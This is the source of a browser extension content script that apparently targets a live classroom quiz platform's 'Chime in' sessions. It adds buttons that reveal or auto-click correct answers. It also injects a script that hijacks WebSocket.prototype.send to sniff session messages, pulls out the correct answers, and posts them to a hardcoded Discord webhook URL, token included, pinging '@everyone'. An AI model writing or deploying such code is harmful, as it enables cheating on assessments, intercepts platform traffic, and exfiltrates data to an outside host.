const rhButton = document.createElement('button');
const sButton = document.createElement('button')
const toggleButton = document.createElement('button')
const div = document.createElement('div')

rhButton.innerText = 'R';
rhButton.className = "reveal-btn switch-btn"

sButton.innerText = "S"
sButton.className = "select-btn switch-btn"

toggleButton.innerText = "O"
toggleButton.className = "switch-btn toggle-off-btn"
toggleButton.id = "toggleBtn"

div.className = "btn-container-div"

div.appendChild(rhButton);
div.appendChild(sButton)
div.appendChild(toggleButton)

document.body.appendChild(div)

let isRevealed = false;
let answerData = []

rhButton.addEventListener("click", () => {
  if(isRevealed){
    isRevealed = !isRevealed
    rhButton.innerText = "R"
    rhButton.className = "reveal-btn switch-btn"
    document.querySelectorAll(".correct-answer").forEach(element => {
      element.classList.remove("correct-answer")
    })
  }else{
    isRevealed = !isRevealed
    rhButton.innerText = "H"
    rhButton.className = "hide-btn switch-btn"
    handleModifications(true)
}})

sButton.addEventListener("click", () => {
  handleModifications(false)
})

async function retreiveData() {
  if(answerData.length < 1){
    response = await browser.runtime.sendMessage({message: "answer_request"})
      if(response.response.length < 1){
        document.location.reload();
      }else{
        answerData = response.response
        return answerData
      }
  } else {
    return answerData
  }
}

async function handleModifications(reveal) {
  const data = await retreiveData()
  if(!data || data.length < 1) return;
  const elements = document.querySelectorAll("article.participant-prompt")
  elements.forEach((element, index) => {
    const options = element.childNodes[1].childNodes[0].childNodes[0].children
    let selected = false
    data[index].forEach((answer) => {
      if(reveal){
        options[answer].children[1].className += " correct-answer"
      }else{
        if(!selected){
          options[answer].children[0].click()
          selected = true
        }
      }
    })
  })
}

injectionString = `
  let isRunning = false; 
  const toggleButton = document.getElementById("toggleBtn"); 

  function handleMessage(msg){
    if(!(isRunning && msg.data.includes("Session"))) return;
    const params = {content: "Placeholder content"};
    if(msg.data.includes("StartSession")){
      const data = JSON.parse(msg.data.substring(2))[2]
      const answerData = []
      data['session']['question']['question_info']['question_responses'].forEach((question, index) => {
        if(question['correct']){
          answerData.push(\`\${index + 1}: \${question['text'].substring(3, question['text'].length - 4)}\`)
        }
      })
      params.content = \`Chime in opened, correct answers: \${answerData.join(", ")}. @everyone\`
    
    }else{
      params.content = "Chime in session ended! @everyone"
    }
    const request = new XMLHttpRequest()
    request.open("POST", "https://discord.com/api/webhooks/1091399045660028948/8YqZNyQyF63DRFsqEw0v7EwlSQBfEGqJ0qKXchGFKampOu8WF52FqRUAeR5kxlv6FcHK");
    request.setRequestHeader('Content-type', 'application/json');
    request.send(JSON.stringify(params));
  }

  function socketSniffer(){
    WebSocket.prototype._send = WebSocket.prototype.send;
      WebSocket.prototype.send = function (data) {
        this._send(data);
        this.addEventListener('message', handleMessage, false);
        this.send = function (data) {
          this._send(data);
        };
      }
  }

  toggleButton.addEventListener("click", ()=> {
    if(isRunning){
      isRunning = false;
      toggleButton.textContent = "O"
      toggleButton.className = "toggle-off-btn switch-btn"
    }else{
      isRunning = true;
      toggleButton.textContent = "I"
      toggleButton.className = "toggle-on-btn switch-btn"
    }
  })

  socketSniffer();
`

const script = document.createElement('script');
script.textContent = injectionString;
(document.head || document.documentElement).appendChild(script);
